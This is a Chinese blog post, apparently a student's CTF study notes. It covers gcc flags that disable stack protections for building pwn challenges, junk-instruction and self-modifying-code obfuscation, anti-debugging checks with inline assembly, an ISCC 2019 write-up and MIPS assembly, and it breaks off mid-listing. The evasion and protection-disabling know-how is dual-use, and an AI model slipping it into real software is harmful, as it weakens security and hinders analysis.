

<!DOCTYPE html>
<html lang="zh-Hans" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/pisanbao.jpg">
  <link rel="icon" href="/img/pisanbao.jpg">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="皮三宝">
  <meta name="keywords" content="">
  
    <meta name="description" content="如何荒废一暑假23333暑假玩太爽了都没怎么学习这篇博客记录一下我从7月14到8月24这几天来的学习把&#x2F;&#x2F;没学多少，大部分时间都在玩。所以tcl">
<meta property="og:type" content="article">
<meta property="og:title" content="暑假学习随笔">
<meta property="og:url" content="http://www.psbazx.com/2019/07/15/%E6%9A%91%E5%81%87%E5%AD%A6%E4%B9%A0%E9%9A%8F%E7%AC%94/index.html">
<meta property="og:site_name" content="皮三宝のBlog">
<meta property="og:description" content="如何荒废一暑假23333暑假玩太爽了都没怎么学习这篇博客记录一下我从7月14到8月24这几天来的学习把&#x2F;&#x2F;没学多少，大部分时间都在玩。所以tcl">
<meta property="og:locale">
<meta property="og:image" content="http://www.psbazx.com/2019/07/15/%E6%9A%91%E5%81%87%E5%AD%A6%E4%B9%A0%E9%9A%8F%E7%AC%94/1.png">
<meta property="og:image" content="http://www.psbazx.com/2019/07/15/%E6%9A%91%E5%81%87%E5%AD%A6%E4%B9%A0%E9%9A%8F%E7%AC%94/2.png">
<meta property="og:image" content="http://www.psbazx.com/2019/07/15/%E6%9A%91%E5%81%87%E5%AD%A6%E4%B9%A0%E9%9A%8F%E7%AC%94/3.png">
<meta property="og:image" content="http://www.psbazx.com/2019/07/15/%E6%9A%91%E5%81%87%E5%AD%A6%E4%B9%A0%E9%9A%8F%E7%AC%94/6.png">
<meta property="og:image" content="http://www.psbazx.com/2019/07/15/%E6%9A%91%E5%81%87%E5%AD%A6%E4%B9%A0%E9%9A%8F%E7%AC%94/7.png">
<meta property="og:image" content="http://www.psbazx.com/2019/07/15/%E6%9A%91%E5%81%87%E5%AD%A6%E4%B9%A0%E9%9A%8F%E7%AC%94/4.png">
<meta property="og:image" content="http://www.psbazx.com/2019/07/15/%E6%9A%91%E5%81%87%E5%AD%A6%E4%B9%A0%E9%9A%8F%E7%AC%94/5.png">
<meta property="og:image" content="http://www.psbazx.com/2019/07/15/%E6%9A%91%E5%81%87%E5%AD%A6%E4%B9%A0%E9%9A%8F%E7%AC%94/13.png">
<meta property="og:image" content="http://www.psbazx.com/2019/07/15/%E6%9A%91%E5%81%87%E5%AD%A6%E4%B9%A0%E9%9A%8F%E7%AC%94/14.png">
<meta property="og:image" content="http://www.psbazx.com/2019/07/15/%E6%9A%91%E5%81%87%E5%AD%A6%E4%B9%A0%E9%9A%8F%E7%AC%94/15.png">
<meta property="og:image" content="http://www.psbazx.com/2019/07/15/%E6%9A%91%E5%81%87%E5%AD%A6%E4%B9%A0%E9%9A%8F%E7%AC%94/16.png">
<meta property="og:image" content="http://www.psbazx.com/2019/07/15/%E6%9A%91%E5%81%87%E5%AD%A6%E4%B9%A0%E9%9A%8F%E7%AC%94/17.png">
<meta property="og:image" content="http://www.psbazx.com/2019/07/15/%E6%9A%91%E5%81%87%E5%AD%A6%E4%B9%A0%E9%9A%8F%E7%AC%94/18.png">
<meta property="og:image" content="http://www.psbazx.com/2019/07/15/%E6%9A%91%E5%81%87%E5%AD%A6%E4%B9%A0%E9%9A%8F%E7%AC%94/19.png">
<meta property="og:image" content="http://www.psbazx.com/2019/07/15/%E6%9A%91%E5%81%87%E5%AD%A6%E4%B9%A0%E9%9A%8F%E7%AC%94/21.png">
<meta property="og:image" content="http://www.psbazx.com/2019/07/15/%E6%9A%91%E5%81%87%E5%AD%A6%E4%B9%A0%E9%9A%8F%E7%AC%94/22.png">
<meta property="og:image" content="http://www.psbazx.com/2019/07/15/%E6%9A%91%E5%81%87%E5%AD%A6%E4%B9%A0%E9%9A%8F%E7%AC%94/23.png">
<meta property="og:image" content="http://www.psbazx.com/2019/07/15/%E6%9A%91%E5%81%87%E5%AD%A6%E4%B9%A0%E9%9A%8F%E7%AC%94/24.png">
<meta property="og:image" content="http://www.psbazx.com/2019/07/15/%E6%9A%91%E5%81%87%E5%AD%A6%E4%B9%A0%E9%9A%8F%E7%AC%94/25.png">
<meta property="og:image" content="http://www.psbazx.com/2019/07/15/%E6%9A%91%E5%81%87%E5%AD%A6%E4%B9%A0%E9%9A%8F%E7%AC%94/26.png">
<meta property="og:image" content="http://www.psbazx.com/2019/07/15/%E6%9A%91%E5%81%87%E5%AD%A6%E4%B9%A0%E9%9A%8F%E7%AC%94/27.png">
<meta property="og:image" content="http://www.psbazx.com/2019/07/15/%E6%9A%91%E5%81%87%E5%AD%A6%E4%B9%A0%E9%9A%8F%E7%AC%94/28.png">
<meta property="og:image" content="http://www.psbazx.com/2019/07/15/%E6%9A%91%E5%81%87%E5%AD%A6%E4%B9%A0%E9%9A%8F%E7%AC%94/29.png">
<meta property="og:image" content="http://www.psbazx.com/2019/07/15/%E6%9A%91%E5%81%87%E5%AD%A6%E4%B9%A0%E9%9A%8F%E7%AC%94/30.png">
<meta property="og:image" content="http://www.psbazx.com/2019/07/15/%E6%9A%91%E5%81%87%E5%AD%A6%E4%B9%A0%E9%9A%8F%E7%AC%94/31.png">
<meta property="og:image" content="http://www.psbazx.com/2019/07/15/%E6%9A%91%E5%81%87%E5%AD%A6%E4%B9%A0%E9%9A%8F%E7%AC%94/20.png">
<meta property="og:image" content="http://www.psbazx.com/2019/07/15/%E6%9A%91%E5%81%87%E5%AD%A6%E4%B9%A0%E9%9A%8F%E7%AC%94/8.png">
<meta property="og:image" content="http://www.psbazx.com/2019/07/15/%E6%9A%91%E5%81%87%E5%AD%A6%E4%B9%A0%E9%9A%8F%E7%AC%94/9.png">
<meta property="og:image" content="http://www.psbazx.com/2019/07/15/%E6%9A%91%E5%81%87%E5%AD%A6%E4%B9%A0%E9%9A%8F%E7%AC%94/10.png">
<meta property="og:image" content="http://www.psbazx.com/2019/07/15/%E6%9A%91%E5%81%87%E5%AD%A6%E4%B9%A0%E9%9A%8F%E7%AC%94/11.png">
<meta property="og:image" content="http://www.psbazx.com/2019/07/15/%E6%9A%91%E5%81%87%E5%AD%A6%E4%B9%A0%E9%9A%8F%E7%AC%94/12.png">
<meta property="article:published_time" content="2019-07-14T20:33:56.000Z">
<meta property="article:modified_time" content="2024-07-22T01:48:18.450Z">
<meta property="article:author" content="皮三宝">
<meta property="article:tag" content="re">
<meta property="article:tag" content="ctf">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://www.psbazx.com/2019/07/15/%E6%9A%91%E5%81%87%E5%AD%A6%E4%B9%A0%E9%9A%8F%E7%AC%94/1.png">
  
  
  
  <title>暑假学习随笔 - 皮三宝のBlog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"www.psbazx.com","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 5.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>pisanbao</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                主页
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                归档
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-category-fill"></i>
                分类
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                标签
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                关于
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/1.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="暑假学习随笔"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2019-07-14 20:33" pubdate>
          July 14, 2019 pm
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          43k wörter
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          358 minuten
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">暑假学习随笔</h1>
            
            
              <div class="markdown-body">
                
                <p>如何荒废一暑假23333<br>暑假玩太爽了都没怎么学习<br>这篇博客记录一下我从7月14到8月24这几天来的学习把<br>//没学多少，大部分时间都在玩。<br>所以tcl</p>
<a id="more"></a>
<h1 id="pwn出题"><a href="#pwn出题" class="headerlink" title="pwn出题"></a>pwn出题</h1><p>gcc -m32 hello.c    指定32位<br>gcc stack.c -fno-stack-protector -no-pie -o stack<br>NX：-z execstack / -z noexecstack (关闭 / 开启)    不让执行栈上的数据，于是JMP ESP就不能用了<br>Canary：-fno-stack-protector /-fstack-protector / -fstack-protector-all (关闭 / 开启 / 全开启)  栈里插入cookie信息<br>PIE：-no-pie / -pie (关闭 / 开启)   地址随机化，另外打开后会有get_pc_thunk<br>RELRO：-z norelro / -z lazy / -z now (关闭 / 部分开启 / 完全开启)  对GOT表具有写权限</p>
<h1 id="花指令"><a href="#花指令" class="headerlink" title="花指令"></a>花指令</h1><p>简单的花就那样还是挺好分辨的<br>像什么jnz jz配合啥的<br>还有垃圾跳转等等<br>还是要具体问题具体分析<br>看题目的花是咋样的</p>
<h1 id="smc"><a href="#smc" class="headerlink" title="smc"></a>smc</h1><p>用VirtualProtect(addr,size,PAGE_READWRITE,lpflOldProtect)修改代码段权限<br>传入的addr定义为unsigned char*使得可以逐字节加密<br>最后再次调用VirtualProtect(addr,size,lpflOldProtect,lpflOldProtect)还原代码段权限<br>靠函数指针实现<br>这个比较熟悉了。。。<br>一般出题的话都是写个解密函数<br>加密代码时直接在ida里patchbyte<br>如果说要改进的话<br>可以试一下双重smc<br>把加密的函数也给smc了这样就不能通过交叉引用来找到加密代码<br>但效果没那么明显。。。</p>
<h1 id="反跟踪"><a href="#反跟踪" class="headerlink" title="反跟踪"></a>反跟踪</h1><h2 id="IsDebuggerpresent"><a href="#IsDebuggerpresent" class="headerlink" title="IsDebuggerpresent"></a>IsDebuggerpresent</h2><p>通过读取PEB中的BeingDebugged标志来判断是否在调试<br>BeingDebugged位于PEB偏移2的位置<br>然而PEB又位于TEB偏移0x30位置，所以可以通过TEB来定位PEB<br>而当windows加载程序时<br>TEB的位置总会被加载到fs:[0]处<br>所以IsDebuggerpresent也能写成</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">__asm__(<br>        <span class="hljs-string">&quot;mov eax, fs:[0x30];&quot;</span><br>        <span class="hljs-string">&quot;movzx eax,byte ptr [eax+2];&quot;</span><br>    );<br>    <span class="hljs-regexp">//</span>IsDebuggerpresent内联汇编实现<br></code></pre></td></tr></table></figure>
<h2 id="NtGlobalFlag"><a href="#NtGlobalFlag" class="headerlink" title="NtGlobalFlag"></a>NtGlobalFlag</h2><p>与BeingDebugged类似<br>当程序在调试时<br>NtGlobalFlag标志应为0x70<br>故有另一种IsDebuggerpresent写法</p>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs abnf">__asm__(<br>        <span class="hljs-string">&quot;mov eax, fs:[0x30];&quot;</span><br>        <span class="hljs-string">&quot;mov eax,[eax+0x68];&quot;</span><br>        <span class="hljs-string">&quot;and eax,0x70;&quot;</span><br>    )<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
<h2 id="Heap-Magic"><a href="#Heap-Magic" class="headerlink" title="Heap Magic"></a>Heap Magic</h2><p>这是在x1c面试题中出现的<br>算是一个暗桩<br>不能说是反调试，但是能改变某些东西。<br>可以直接写代码康康测试下</p>
<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="hljs-built_in">int</span> main()<br>&#123;<br>    <span class="hljs-built_in">int</span> *a<span class="hljs-comment">;</span><br>    a = malloc(<span class="hljs-number">0x10</span>)<span class="hljs-comment">;</span><br>    printf(<span class="hljs-string">&quot;%x&quot;</span>,*a)<span class="hljs-comment">;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><span class="hljs-comment">;</span><br>&#125;<br></code></pre></td></tr></table></figure>
<p>调试情况下就能看到0xBAADF00D在内存中了<br><img src="1.png" srcset="/img/loading.gif" lazyload alt="1"><br>如果这时根据malloc的数生成一个box啥的，在调试中的值和运行中的就会不一样<br>很恶心啊</p>
<h1 id="ISCC-2019"><a href="#ISCC-2019" class="headerlink" title="ISCC_2019"></a>ISCC_2019</h1><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><p>简单的xor</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span> = &#x27;&#x27;<br><span class="hljs-attribute">flag</span> += chr(<span class="hljs-number">401978124</span>^<span class="hljs-number">0</span>x<span class="hljs-number">17</span>F<span class="hljs-number">5</span>B<span class="hljs-number">345</span>)<br><span class="hljs-attribute">flag</span> += chr(<span class="hljs-number">0</span>xF<span class="hljs-number">16</span>B<span class="hljs-number">77</span>E<span class="hljs-number">2</span>^<span class="hljs-number">4050352049</span>)<br><span class="hljs-attribute">flag</span> += chr(<span class="hljs-number">2998016260</span>^ <span class="hljs-number">0</span>xB<span class="hljs-number">2</span>B<span class="hljs-number">21947</span>)<br><span class="hljs-attribute">flag</span> += chr(<span class="hljs-number">1487534536</span>^ <span class="hljs-number">0</span>x<span class="hljs-number">58</span>A<span class="hljs-number">9</span>F<span class="hljs-number">98</span>B)<br><span class="hljs-attribute">flag</span> += chr(<span class="hljs-number">547986801</span>^ <span class="hljs-number">0</span>x<span class="hljs-number">20</span>A<span class="hljs-number">99</span>D<span class="hljs-number">0</span>A)<br><span class="hljs-attribute">flag</span> += chr(<span class="hljs-number">2530761537</span>^ <span class="hljs-number">0</span>x<span class="hljs-number">96</span>D<span class="hljs-number">85</span>B<span class="hljs-number">20</span>)<br><span class="hljs-attribute">flag</span> += chr(<span class="hljs-number">0</span>xBBEA<span class="hljs-number">9</span>A<span class="hljs-number">56</span>^ <span class="hljs-number">0</span>xBBEA<span class="hljs-number">9</span>A<span class="hljs-number">3</span>E)<br><span class="hljs-attribute">flag</span> += chr(<span class="hljs-number">894512607</span>^ <span class="hljs-number">0</span>x<span class="hljs-number">35512</span>DBE)<br><span class="hljs-attribute">flag</span> += chr(<span class="hljs-number">674815144</span>^ <span class="hljs-number">0</span>x<span class="hljs-number">2838</span>DCF<span class="hljs-number">7</span>)<br><span class="hljs-attribute">flag</span> += chr(<span class="hljs-number">1319231476</span>^ <span class="hljs-number">0</span>x<span class="hljs-number">4</span>EA<span class="hljs-number">1</span>DF<span class="hljs-number">87</span>)<br><span class="hljs-attribute">flag</span> += chr(<span class="hljs-number">3794652292</span>^ <span class="hljs-number">0</span>xE<span class="hljs-number">22</span>DCCED)<br><span class="hljs-attribute">flag</span> += chr(<span class="hljs-number">3710674499</span>^ <span class="hljs-number">0</span>xDD<span class="hljs-number">2</span>C<span class="hljs-number">662</span>E)<br><span class="hljs-attribute">flag</span> += chr(<span class="hljs-number">275462068</span>^ <span class="hljs-number">0</span>x<span class="hljs-number">106</span>B<span class="hljs-number">37</span>C<span class="hljs-number">4</span>)<br><span class="hljs-attribute">flag</span> += chr(<span class="hljs-number">1186218498</span>^ <span class="hljs-number">0</span>x<span class="hljs-number">46</span>B<span class="hljs-number">4426</span>E)<br><span class="hljs-attribute">flag</span> += chr(<span class="hljs-number">2858928017</span>^ <span class="hljs-number">0</span>xAA<span class="hljs-number">67</span>C<span class="hljs-number">7</span>F<span class="hljs-number">4</span>)<br><span class="hljs-attribute">flag</span> += chr(<span class="hljs-number">1925213922</span>^ <span class="hljs-number">0</span>x<span class="hljs-number">72</span>C<span class="hljs-number">06</span>EBD)<br><span class="hljs-attribute">flag</span> += chr(<span class="hljs-number">2953936653</span>^ <span class="hljs-number">0</span>xB<span class="hljs-number">0117</span>F<span class="hljs-number">7</span>F)<br><span class="hljs-attribute">flag</span> += chr(<span class="hljs-number">4179334025</span>^ <span class="hljs-number">0</span>xF<span class="hljs-number">91</span>B<span class="hljs-number">93</span>EC)<br><span class="hljs-attribute">flag</span> += chr(<span class="hljs-number">3560761698</span>^ <span class="hljs-number">0</span>xD<span class="hljs-number">43</span>CE<span class="hljs-number">914</span>)<br><span class="hljs-attribute">flag</span> += chr(<span class="hljs-number">4142533768</span>^ <span class="hljs-number">0</span>xF<span class="hljs-number">6</span>EA<span class="hljs-number">0</span>CED)<br><span class="hljs-attribute">flag</span> += chr(<span class="hljs-number">1076496869</span>^ <span class="hljs-number">0</span>x<span class="hljs-number">402</span>A<span class="hljs-number">0997</span>)<br><span class="hljs-attribute">flag</span> += chr(<span class="hljs-number">2913777524</span>^ <span class="hljs-number">0</span>xADACB<span class="hljs-number">707</span>)<br><span class="hljs-attribute">flag</span> += chr(<span class="hljs-number">3885782341</span>^ <span class="hljs-number">0</span>xE<span class="hljs-number">79</span>C<span class="hljs-number">5520</span>)<br><span class="hljs-attribute">flag</span> += chr(<span class="hljs-number">1266072881</span>^ <span class="hljs-number">0</span>x<span class="hljs-number">4</span>B<span class="hljs-number">76</span>BD<span class="hljs-number">4</span>C)<br><span class="hljs-attribute">print</span> flag<br></code></pre></td></tr></table></figure>
<h2 id="android"><a href="#android" class="headerlink" title="android"></a>android</h2><p>题目明显是让你用z3去约束求解的<br>简单来说就是奇偶分组录入然后进行一堆条件限制<br>多解//iscc正常操作<br>最后找到一段有意义的字符串<br>还有就是明明就是一个re题在里面藏了字符串<br><img src="2.png" srcset="/img/loading.gif" lazyload alt="2"><br>一个base64<br>看到这边可能有人要开喷了怎么会有这种题目<br>没办法，iscc正常操作。<br>而且装上后发现没有输入框<br>//估计是本来有输入框，技术支持发现多解后，就把输入框关了<br>//沙雕题</p>
<h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><p>pwn的高地和私地题目搞反了把。。。<br>高地过于简单，就一个栈溢出，后门都写好了<br>私地呢。。。</p>
<p>总结一下。。。第一次打国家级的比赛，氛围很。。。差<br>北理工主办方俩支队伍被锤的20开外<br>py的太多了<br>心知肚明</p>
<h1 id="mips入门"><a href="#mips入门" class="headerlink" title="mips入门"></a>mips入门</h1><h2 id="mips64题目大致写法"><a href="#mips64题目大致写法" class="headerlink" title="mips64题目大致写法"></a>mips64题目大致写法</h2><p>1.运行<br>qemu-mips64 ./mips64</p>
<p>2.调试<br>qemu-mips64 -g 9999 ./mips64<br>开启端口<br>下面可以选择用gdb还是用ida调<br>//不怎么喜欢ida，还是用ida来静态分析比较好<br>//而且ida调一次崩一次，下面与gdb交互的窗口也莫名不能用</p>
<p>2.1<br>gdb调试<br>/usr/local/mips64-gdb/bin/mips64-linux-gdb<br>file mips64<br>set architecture mips:isa64r2   //设置类型<br>target remote localhost:9999</p>
<p>3.断点<br>使用-strace参数<br>明确分析断点<br>然后疯狂下断点查看</p>
<p>还需要注意一下流程图。主要还是定位关键代码<br>配合猜测基本可以做</p>
<h2 id="mips32汇编"><a href="#mips32汇编" class="headerlink" title="mips32汇编"></a>mips32汇编</h2><p>首先有贼多的寄存器。。。</p>
<h3 id="存储指令集-相对偏移"><a href="#存储指令集-相对偏移" class="headerlink" title="存储指令集/相对偏移"></a>存储指令集/相对偏移</h3><p>l s指令就是加载和存储<br>la就是lea取地址<br>lw    $t2, ($t0)<br>()就是[]指针<br>sw    $t2, -12($t0)<br>相对偏移什么的标记在前面<br>sw是前面赋给后面<br>相对偏移也要注意类型<br>sw $t1, 4($t0)<br>就是给$t0下一个word赋值$t1</p>
<h3 id="算术指令集"><a href="#算术指令集" class="headerlink" title="算术指令集"></a>算术指令集</h3><p>add $t0,$t1,$t2 # $t0 = $t1 + $t2;<br>sub    $t2,$t3,$t4    #  $t2 = $t3 Ð $t4<br>addi    $t2,$t3, 5    #  $t2 = $t3 + 5;   “add immediate” (no sub immediate)<br>addu    $t1,$t6,$t7    #  $t1 = $t6 + $t7;   add as unsigned integers<br>subu    $t1,$t6,$t7    #  $t1 = $t6 + $t7;   subtract as unsigned integers<br>很简单易懂啊</p>
<h3 id="控制流指令集"><a href="#控制流指令集" class="headerlink" title="控制流指令集"></a>控制流指令集</h3><p>if else<br>b    target        #  unconditional branch to program label target<br>beq    $t0,$t1,target    #  branch to target if  $t0 = $t1<br>blt    $t0,$t1,target    #  branch to target if  $t0 &lt; $t1<br>ble    $t0,$t1,target    #  branch to target if  $t0 &lt;= $t1<br>bgt    $t0,$t1,target    #  branch to target if  $t0 &gt; $t1<br>bge    $t0,$t1,target    #  branch to target if  $t0 &gt;= $t1<br>bne    $t0,$t1,target    #  branch to target if  $t0 != $t1<br>和x86大同小异<br>把b改成j的话就认识了</p>
<p>jump<br>j    target    　　　　 #  unconditional jump to program label target<br>jr    $t3        #  jump to address contained in $t3 (“jump register”)</p>
<p>call<br>jal    sub_label    #  “jump and link”</p>
<p>return<br>jr    $ra //$ra保存着返回地址<br>如果多次调用函数<br>返回地址就用栈来存储</p>
<h2 id="mips64"><a href="#mips64" class="headerlink" title="mips64"></a>mips64</h2><p>其实没多大变化。。。<br>32位word，64位double<br>运算类：add变成dadd，同理sub/mul/div变成dsub/dmul/ddiv<br>访存: lw变成ld, sw变成sd<br>寄存器名： S0/S1…   全部变为r0/r1/… / r31</p>
<h3 id="具体注意点"><a href="#具体注意点" class="headerlink" title="具体注意点"></a>具体注意点</h3><p>movz r1，r2,r3      If(r3==0) r1=r2<br>movn reg,reg,reg    move if register not equal to zero<br>mov.s freg,freg     move floating-point(single FP )<br>mov.d freg,freg     move floating-point(double FP )<br>mtc1 reg,freg       move data from integer register to FP register<br>mfc1 reg,freg       move data from FP register to integer register<br>lui  reg,imm        load upper half of register immediate</p>
<h3 id="标志位"><a href="#标志位" class="headerlink" title="标志位"></a>标志位</h3><p>c.lt.d freg,freg    set FP flag if less than//在double范围内，如果是float则是c.lt.s，查看fpu可用i fl<br>c.eq.d freg,freg    set FP flag if equal to<br>c.le.d freg,freg    set FP flag if less than or equal to</p>
<p>slt reg,reg,reg     set if less than<br>dslt reg,reg,reg<br>sltu reg,reg,reg<br>slti reg,reg,imm<br>sltiu reg,reg,imm</p>
<h3 id="跳转"><a href="#跳转" class="headerlink" title="跳转"></a>跳转</h3><p>j imm           jump to address                            (不会保存返回地址)<br>jr reg          jump to address in register             （不会保存返回地址）<br>jal imm         跳转到imm地址并且将返回地址记录在寄存器ra中（会保存）<br>jalr reg        jump and link to address in register  （会保存）</p>
<p>beqz reg,imm        branch if register is equal to zero<br>bnez reg,imm        branch if register is not equal to zero<br>beq reg,reg,imm     branch if pair of registers are equal<br>bne reg,reg,imm     branch if pair of registers are not equal<br>bc1t imm            branch to address if FP flag is TRUE<br>bc1f imm            branch to address if FP flag is FALSE</p>
<h3 id="控制"><a href="#控制" class="headerlink" title="控制"></a>控制</h3><p>nop             no operation<br>halt            stops the program</p>
<p>另外mips64遇到跳转指令时都会使用到分支延迟</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-class">.text</span>:<span class="hljs-number">0000000120003</span>C20 loc_120003C20:<br><span class="hljs-selector-class">.text</span>:<span class="hljs-number">0000000120003</span>C20                 c<span class="hljs-selector-class">.lt</span><span class="hljs-selector-class">.s</span>  <span class="hljs-variable">$fcc6</span>, <span class="hljs-variable">$f1</span>, <span class="hljs-variable">$f0</span><br><span class="hljs-selector-class">.text</span>:<span class="hljs-number">0000000120003</span>C24                 bc1f    <span class="hljs-variable">$fcc6</span>, loc_120003B24<br><span class="hljs-selector-class">.text</span>:<span class="hljs-number">0000000120003</span>C28                 ld      <span class="hljs-variable">$t9</span>, -<span 